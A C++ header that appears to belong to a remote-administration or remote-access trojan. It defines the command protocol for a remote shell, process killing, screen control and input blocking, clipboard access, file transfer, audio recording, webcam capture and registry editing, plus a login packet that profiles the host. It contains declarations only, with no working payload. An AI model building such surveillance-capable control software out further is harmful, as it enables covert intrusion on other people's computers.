#pragma once

#define UM_CLIENT_LOGIN WM_USER+1000
#define UM_OPEN_REMOTE_MESSAGE_DIALOG WM_USER+1005 
#define UM_OPEN_CMD_MANAGER_DIALOG WM_USER+1006 
#define UM_OPEN_PROCESS_MANAGER_DIALOG WM_USER+1007
#define UM_OPEN_THREADER_MANAGER_DIALOG WM_USER+1008
#define UM_OPEN_HANDLE_MANAGER_DIALOG WM_USER+1009
#define UM_OPEN_MODULE_MANAGER_DIALOG WM_USER+1010
#define UM_OPEN_WINDOW_MANAGER_DIALOG WM_USER+1011
#define UM_OPEN_REMOTE_CONTROLLER_DIALOG WM_USER+1012
#define UM_OPEN_FILE_MAMAGER_DIALOG  WM_USER+1013 
#define UM_OPEN_AUDIO_MAMAGER_DIALOG WM_USER+1014 
#define UM_OPEN_VIDEO_MAMAGER_DIALOG WM_USER+1014 
#define UM_OPEN_SERVICE_MAMAGER_DIALOG WM_USER+1016 
#define UM_OPEN_REGISTER_MAMAGER_DIALOG WM_USER+1017
#define UM_OPEN_REMOTE_OPEN_PROCESS_DIALOG WM_USER+1090 



#define PROCESS_MANAGER_DIALOG 0x10
#define THREADER_MANAGER_DIALOG 0x20
#define HANDLE_MANAGER_DIALOG 0x30
#define MODULE_MANAGER_DIALOG 0x40
#define CMD_MANAGER_DIALOG 0x50
#define WINDOW_MANAGER_DIALOG 0x60
#define REMOTE_CONTROL_DIALOG 0x70
#define FILE_MANAGER_DIALOG 0x80
#define AUDIO_MANAGER_DIALOG 0x90
#define VIDEO_MANAGER_DIALOG 0x100
#define SERVICE_MANAGER_DIALOG 0x110
#define REGISTER_MANAGER_DIALOG  0x120


enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送
};


enum
{
	CLIENT_LOGIN,		    //上线包
	CLIENT_GET_OUT,			//强制下线
	CLIENT_GET_REPLY,			//消息回应		
	//远程消息
	CLIENT_REMOTE_MESSAGE,
	CLIENT_REMOTE_MESSAGE_REPLY,
	CLIENT_REMOTE_MESSAGE_COMPLETE,
	//关机
	CLIENT_SHUT_DOWN_REQUEST,
	CLIENT_SHUT_DOWN_REPLY,
	//CMD
	CLIENT_CMD_MANAGER,
	CLIENT_CMD_MANAGER_REPLY,
	//进程操作
	CLIENT_PROCESS_MANAGER,
	CLIENT_PROCESS_MANAGER_REPLY,
	CLIENT_PROCESS_MANAGER_REFRESH,
	CLIENT_PROCESS_MANAGER_KILL_ONE,
	CLIENT_PROCESS_MANAGER_KILL_ONE_REPLY,
	CLIENT_PROCESS_MANAGER_ENUM_THREADER,
	CLIENT_PROCESS_MANAGER_ENUM_THREADER_REPLY,
	CLIENT_REMOTE_OPEN_PROCESS,
	CLIENT_REMOTE_OPEN_PROCESS_REPLY,
	//窗口管理
	CLIENT_WINDOWS_MANAGER,
	CLIENT_WINDOWS_MANAGER_REPLY,
	CLIENT_WINDOWS_MANAGER_REFRESH,
	//远程控制
	CLIENT_REMOTE_CONTROLLER,
	CLIENT_REMOTE_CONTROLLER_REPLY,
	CLIENT_REMOTE_CONTROLLER_FIRST_SCREEN,
	CLIENT_REMOTE_CONTROLLER_NEXT_SCREEN,
	CLIENT_REMOTE_CONTROLLER_CONTROL,
	CLIENT_REMOTE_CONTROLLER_BLOCK_INPUT,
	CLIENT_REMOTE_CONTROLLER_GET_CLIPBOARD,
	CLIENT_REMOTE_CONTROLLER_SET_CLIPBOARD,
	CLIENT_REMOTE_CONTROLLER_GET_CLIPBOARD_REPLY,
	CLIENT_REMOTE_CONTROLLER_SET_CLIPBOARD_REPLY,
	CLIENT_REMOTE_CONTROLLER_SEND_CTRL_ALT_DEL,
	//文件管理
	CLIENT_FILE_MANAGER,
	CLIENT_FILE_MANAGER_REPLY,
	CLIENT_FILE_MANAGER_FILE_LIST,
	CLIENT_FILE_MANAGER_FILE_LIST_REPLY,
	CLIENT_FILE_MANAGER_NEW_FLODER,
	CLIENT_FILE_MANAGER_NEW_FLODER_REPLY,
	CLIENT_FILE_MANAGER_DELETE_FLODER,
	CLIENT_FILE_MANAGER_DELETE_FILE,
	CLIENT_FILE_MANAGER_DELETE_REPLY,
	CLIENT_FILE_MANAGER_SEND_FILE_INFORMATION,  //服务器向客户端发送一个传送文件的文件信息
	CLIENT_FILE_MANAGER_TRANSFER_MODE_REQUIRE,  //客户端中发现了重名文件
	CLIENT_FILE_MANAGER_SET_TRANSFER_MODE,
	CLIENT_FILE_MANAGER_FILE_DATA,
	CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE,
	CLIENT_FILE_MANAGER_SEND_COPY_DIRECTORY_FILEFULLPATH,
	CLIENT_FILE_MANAGER_SEND_COPY_DIRECTORY_FILEFULLPATH_REPLY,
	CLIENT_FILE_MANAGER_SEND_COPY_DIRECTORY_FILEFULLPATH_END,
	CLIENT_FILE_MANAGER_SEND_COPY_FILE_INFORMATION_FROM_CLIENT,
	CLIENT_FILE_MANAGER_SEND_COPY_FILE_INFORMATION_FROM_CLIENT_REPLY,
	CLIENT_FILE_MANAGER_COPY_FILE_DATA_TO_SERVER,
	CLIENT_FILE_MANAGER_COPY_FILE_DATA_TO_SERVER_REPLY,
	CLIENT_FILE_MANAGER_ONE_COPY_FILE_SUCCESS,
	//音频管理
	CLIENT_AUDIO_MANAGER,
	CLIENT_AUDIO_MANAGER_REPLY,
	CLIENT_AUDIO_MANAGER_RECORD_DATA,
	CLENT_AUDIO_MANAGER_PLAY,
	//视频管理
	CLIENT_VIDEO_MANAGER,
	CLIENT_VIDEO_MANAGER_REPLY,
	//
	//服务管理
	CLIENT_SERVICE_MANAGER,
	CLIENT_SERVICE_MANAGER_LIST_REPLY,
	CLIENT_SERVICE_MANAGER_CONFIG,
	//注册表管理
	CLIENT_REGISTER_MANAGER,
	CLIENT_REGISTER_MANAGER_REPLY,
	CLIENT_REGISTER_DATA_CONTINUE,
	CLIENT_REGISTER_PATH_DATA,
	CLIENT_REGISTER_KEY_DATA,
	//线程操作
	CLIENT_THREADER_MANAGER_REFRESH,
	CLIENT_THREADER_MANAGER_KILL_ONE,
	CLIENT_THREADER_MANAGER_KILL_ONE_REPLY,
	CLIENT_THREADER_MANAGER_SUSPEND,
	CLIENT_THREADER_MANAGER_SUSPEND_REPLY,
	CLIENT_THREADER_MANAGER_RESUME,
	CLIENT_THREADER_MANAGER_RESUME_REPLY,
	//枚举进程句柄
	CLIENT_PROCESS_MANAGER_ENUM_HANDLE,
	CLIENT_PROCESS_MANAGER_ENUM_HANDLE_REPLY,
	//枚举进程模块
	CLIENT_PROCESS_MANAGER_ENUM_MODULE,
	CLIENT_PROCESS_MANAGER_ENUM_MODULE_REPLY,

	
	CLIENT_GO_ON
};

#pragma pack(1)
typedef struct _LOGIN_INFORMATION_
{
	BYTE            IsToken;                     //信息头部
	OSVERSIONINFOEX OsVersionInfoEx;			 //版本信息
	char			ProcessNameString[MAX_PATH]; //CPU信息
	IN_ADDR			ClientAddress;				 //储存32位的Ipv4地址的数据结构
	char			HostName[MAX_PATH];          //主机名
	BOOL			IsWebCameraExist;            //是否有摄像头
	DWORD			WebSpeed;					 //网速

}LOGIN_INFORMATION, *PLOGIN_INFORMATION;

#pragma pack(1)
typedef struct _PROCESS_ITEM_INFORMATION_
{
	HANDLE ProcessID;
	char   ProcessImageName[MAX_PATH];
	char   ProcessFullPath[MAX_PATH];
	char   IsWow64Process[20];
}PROCESS_ITEM_INFORMATION, *PPROCESS_ITEM_INFORMATION;